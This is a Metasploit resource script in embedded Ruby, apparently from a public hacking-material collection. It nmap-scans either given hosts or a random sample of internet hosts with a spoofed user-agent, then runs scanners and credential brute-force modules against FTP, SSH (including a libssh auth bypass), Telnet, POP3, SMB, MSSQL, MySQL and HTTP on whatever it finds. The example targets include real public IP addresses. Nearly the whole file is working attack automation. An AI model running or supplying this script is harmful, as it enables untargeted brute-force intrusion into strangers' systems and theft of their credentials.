   <ruby>
      run_single("workspace -a redteam")
      help = %Q|

        Description:
          setg SAVE_DB true - Save workspace redteam to database.xml
          setg LIMMIT 1000 - Limmit the number of random WAN hosts to search
          setg RANDOM_HOSTS true - To instruct db_nmap to random search in WAN for hosts with ports open
          setg RHOSTS 216.15.177.33 162.246.22.133 - To instruct db_nmap to scan hosts for ports open.
          setg USERPASS_FILE /root/my_dicionary.txt - To instruct auxiliarys to use our own dicionary file
          brute_force.rc will use nmap to populate the msfdb database with remote hosts address then it
          triggers msf auxiliary/scanners based on host(s) open port(s) and service name discovery.
          This module probes for 21:22:23:80:110:445:1433:3306 remote TCP ports in open state.

        Execute in msfconsole:
          setg SAVE_DB <true-or-blank>
          setg LIMMIT <number-of-rhosts>
          setg RANDOM_HOSTS <true-or-blank>
          setg RHOSTS <hosts-separated-by-spaces>
          setg USERPASS_FILE <absoluct-path-to-dicionary.txt>
          resource <path-to-script>/brute_force.rc

        Author:
          r00t-3xp10it  <pedroubuntu10[at]gmail.com>
      |
      print_line(help)
      Rex::sleep(1.5)
      print_line("")


      ## Make sure we are connected to db
      unless framework.db.active
        print_error("[ERROR] Database not connected to postgresql.")
        print_warning("[execute] service postgresql start")
        run_single("exit")
        return nil
      else
        print_good("Database connected to postgresql.")
        local = Dir.pwd
        Rex::sleep(1.0)
      end

      ## Sellect the type of nmap scan to use
      if (framework.datastore['RANDOM_HOSTS'] == "true")
         if (framework.datastore['LIMMIT'] == nil or framework.datastore['LIMMIT'] == '')
           run_single("setg LIMMIT 300")
           print_line("RHOSTS => Random Search in WAN for:#{framework.datastore['LIMMIT']} alive hosts")
         else
           print_line("LIMMIT => #{framework.datastore['LIMMIT']}")
           print_line("RHOSTS => Random Search in WAN for:#{framework.datastore['LIMMIT']} alive hosts")
         end
      elsif (framework.datastore['RHOSTS'] == nil or framework.datastore['RHOSTS'] == '')
         run_single("setg RHOSTS 192.168.1.0/24")
      elsif (framework.datastore['RHOSTS'])
         print_line("RHOSTS => #{framework.datastore['RHOSTS']}")
      end

      ## Metasploit auxiliarys brute force dicionary absoluct path
      if (framework.datastore['USERPASS_FILE'] == nil or framework.datastore['USERPASS_FILE'] == '')
         # setg USERPASS_FILE /usr/share/metasploit-framework/data/wordlists/piata_ssh_userpass.txt
         run_single("setg USERPASS_FILE #{local}/bin/multi_services_wordlist.txt")
      end

      ## db_nmap WAN or RHOSTS or LOCAL_LAN scan settings
      # HINT: nmap will use a fake user-agent string (iPhone:Safari) while scanning.
      unless (framework.datastore['RANDOM_HOSTS'] == "true")
         run_single("db_nmap -sV -Pn -T4 -O -p 21,22,23,80,110,445,1433,3306 --open --script=http-headers.nse,smb-os-discovery.nse --script-args http.useragent=\"Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_5 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Version/11.0 Mobile/15D60 Safari/604.1\" #{framework.datastore['RHOSTS']}")
      else
         print_good("Nmap: search for random remote hosts with ports 21:22:23:80:110:445:1433:3306 open")
         run_single("db_nmap -sV -Pn -T5 -O -iR #{framework.datastore['LIMMIT']} -p 21,22,23,80,110,445,1433,3306 --open --script=http-headers.nse,smb-os-discovery.nse --script-args http.useragent=\"Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_5 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Version/11.0 Mobile/15D60 Safari/604.1\"")
      end

      ## Read the database 
      run_single("spool brute_force.log")
      print_line("")
      run_single("services")
      print_good("Sellecting target hosts from msf database.")
      xhost = framework.db.hosts.map(&:address).join(' ')
      xport = framework.db.services.map(&:port).join(' ')
      proto = framework.db.services.map(&:proto).join(' ')
      xname = framework.db.hosts.map(&:os_name).join(' ').gsub(' ',', ')
      print_status("Target systems detected: #{xname}")
      run_single("setg RHOSTS #{xhost}")
      Rex::sleep(2.0)

         ## Make sure that exists hosts/ports (open) in database
         if xhost.nil? or xhost == '' or xhost == ' '
              print_error("[ERROR] db_nmap scan did not find any alive connections.")
              print_error("please wait, cleaning recent configurations.")
              Rex::sleep(1.0)
              run_single("unsetg all")
              File.delete('brute_force.log')
              run_single("workspace -d redteam")
              return nil
         elsif xport.nil? or xport == '' or xport == ' '
              print_error("[ERROR] db_nmap did not find any 21:22:23:80:110:445:1433:3306 open ports.")
              print_error("please wait, cleaning recent configurations.")
              Rex::sleep(1.0)
              run_single("unsetg all")
              File.delete('brute_force.log')
              run_single("workspace -d redteam")
              return nil
         end

         ## Make sure that dicionary file exist (user:pass)
         check_word = "#{framework.datastore['USERPASS_FILE']}"
         unless (File.exist?(check_word))
              print_error("[ERROR] Dicionary absoluct path not found.")
              print_error("USERPASS_FILE => #{framework.datastore['USERPASS_FILE']}")
              Rex::sleep(1.0)
           word = %Q|

    [execute] setg USERPASS_FILE <absoluct-path-to-dicionary.txt>
    [example] setg USERPASS_FILE /usr/share/metasploit-framework/data/wordlists/piata_ssh_userpass.txt
    'Remmenber that worldlist must be in user:pass format (one-per-line)'
    'Then we are able to run this resource script again'

           |
           print_line(word)
           print_error("Please wait, cleaning recent configurations.")
           Rex::sleep(1.0)
            run_single("unsetg all")
            File.delete('brute_force.log')
            run_single("workspace -d redteam")
            return nil
         end


         ## Run gather/brute-force modules
         if xport =~ /21/i or proto =~ /ftp/i
              print_warning("Remote Target port: 21 ftp found")
              Rex::sleep(1.0)
              run_single("use auxiliary/scanner/ftp/ftp_version")
              print_line("")
              run_single("services -c name -S ftp -R")
              run_single("exploit")
              run_single("use auxiliary/scanner/ftp/anonymous")
              print_line("")
              run_single("services -c name -S ftp -R")
              run_single("set THREADS 35")
              run_single("exploit")
              run_single("use auxiliary/scanner/ftp/ftp_login")
              run_single("set USERPASS_FILE #{framework.datastore['USERPASS_FILE']}")
              run_single("set STOP_ON_SUCCESS true")
              run_single("set BRUTEFORCE_SPEED 4")
              run_single("set THREADS 70")
              print_line("")
              run_single("services -c name -S ftp -R")
              run_single("exploit")
         end

         if xport =~ /22/i or proto =~ /ssh/i
              print_warning("Remote Target port: 22 ssh found")
              Rex::sleep(1.0)
              run_single("use auxiliary/scanner/ssh/ssh_version")
              run_single("services -c name -S ssh -R")
              run_single("exploit")
              run_single("use auxiliary/scanner/ssh/libssh_auth_bypass.rb")
              run_single("set SPAWN_PTY true")
              run_single("services -c name -S ssh -R")
              run_single("exploit")
              run_single("use auxiliary/scanner/ssh/ssh_login")
              run_single("set USERPASS_FILE #{framework.datastore['USERPASS_FILE']}")
              run_single("set STOP_ON_SUCCESS true")
              run_single("set VERBOSE true")
              run_single("set THREADS 30")
              print_line("")
              run_single("services -c name -S ssh -R")
              run_single("exploit")
         end

         if xport =~ /23/i or proto =~ /telnet/i
              print_warning("Remote Target port: 23 telnet found")
              Rex::sleep(1.0)
              run_single("use auxiliary/scanner/telnet/telnet_version")
              run_single("services -c name -S telnet -R")
              run_single("exploit")
              run_single("use auxiliary/scanner/telnet/telnet_login")
              run_single("set USERPASS_FILE #{framework.datastore['USERPASS_FILE']}")
              run_single("set STOP_ON_SUCCESS true")
              run_single("set THREADS 26")
              print_line("")
              run_single("services -c name -S telnet -R")
              run_single("exploit")
         end

         if xport =~ /110/i or proto =~ /pop3/i
              print_warning("Remote Target port: 110 pop3 found")
              Rex::sleep(1.0)
              run_single("use auxiliary/scanner/pop3/pop3_version")
              run_single("set THREADS 30")
              run_single("services -c name -S pop3 -R")
              run_single("exploit")
              run_single("use auxiliary/scanner/pop3/pop3_login")
              run_single("set STOP_ON_SUCCESS true")
              run_single("set THREADS 16")
              print_line("")
              run_single("services -c name -S pop3 -R")
              run_single("exploit")
         end

         if xport =~ /445/i or proto =~ /smb/i
              print_warning("Remote Target port: 445 smb found")
              Rex::sleep(1.0)
              run_single("use auxiliary/scanner/smb/smb_version")
              run_single("set THREADS 16")
              print_line("")
              run_single("services -c name -S smb -R")
              run_single("exploit")
              run_single("use auxiliary/scanner/smb/smb_enumusers")
              run_single("set THREADS 16")
              print_line("")
              run_single("services -c name -S smb -R")
              run_single("exploit")
              run_single("use auxiliary/scanner/smb/smb_enumshares")
              run_single("set THREADS 16")
              print_line("")
              run_single("services -c name -S smb -R")
              run_single("exploit")
              run_single("use auxiliary/scanner/smb/smb_login")
              run_single("set USERPASS_FILE #{framework.datastore['USERPASS_FILE']}")
              run_single("set STOP_ON_SUCCESS true")
              run_single("set THREADS 16")
              print_line("")
              run_single("services -c name -S smb -R")
              run_single("exploit")
         end

         if xport =~ /1433/i or proto =~ /ms-sql-s/i or proto =~ /mssql/i or proto =~ /mssql-m/i
              print_warning("Remote Target port 1433 mssql found")
              Rex::sleep(1.0)
              run_single("use auxiliary/scanner/mssql/mssql_ping")
              run_single("set THREADS 16")
              print_line("")
              run_single("services -c name -S mssql -R")
              run_single("exploit")
              run_single("use auxiliary/scanner/mssql/mssql_login")
              run_single("set USERPASS_FILE #{framework.datastore['USERPASS_FILE']}")
              print_line("")
              run_single("services -c name -S mssql -R")
              run_single("exploit")
         end

         if xport =~ /3306/i or proto =~ /mysql/i
              print_warning("Remote Target port 3306 mysql found.")
              Rex::sleep(1.0)
              run_single("use auxiliary/scanner/mysql/mysql_version")
              run_single("set THREADS 20")
              print_line("")
              run_single("services -c name -S mysql -R")
              run_single("exploit")
              Rex::sleep(1.5)
              run_single("use auxiliary/scanner/mysql/mysql_login")
              run_single("set USERPASS_FILE #{framework.datastore['USERPASS_FILE']}")
              run_single("set STOP_ON_SUCCESS true")
              run_single("set VERBOSE true")
              run_single("set THREADS 100")
              print_line("")
              run_single("services -c name -S mysql -R")
              run_single("exploit")
              Rex::sleep(1.5)
         end

         if xport =~ /80/i or proto =~ /http/i
              print_warning("Remote Target port: 80 http found")
              Rex::sleep(1.0)
              run_single("use auxiliary/scanner/http/title")
              print_line("")
              run_single("services -c name -S http -R")
              run_single("exploit")
              run_single("use auxiliary/scanner/http/options")
              run_single("set THREADS 11")
              print_line("")
              run_single("services -c name -S http -R")
              run_single("exploit")
              run_single("use auxiliary/scanner/http/dir_scanner")
              run_single("exploit")
              run_single("use auxiliary/scanner/http/http_login")
              run_single("set STOP_ON_SUCCESS true")
              run_single("set THREADS 16")
              print_line("")
              run_single("services -c name -S http -R")
              run_single("exploit")
         end


      ## Save current database to local file (database.xml)
      if (framework.datastore['SAVE_DB'] == "true")
         rand = Rex::Text.rand_text_alpha(5)
         print_warning("Exporting database to: #{local}/database_#{rand}.xml")
         run_single("db_export -f xml -a database_#{rand}.xml")
      end

      ## Cleaning database and unset global variables
      print_warning("Please wait, Cleaning global variables.")
      Rex::sleep(1.5)
      run_single("unsetg all")
      run_single("unset all")
      run_single("workspace -d redteam")
      run_single("back")

      print_warning("Logfile stored under: #{local}/brute_force.log")
      print_warning("https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit_resource_files.md")
   </ruby>
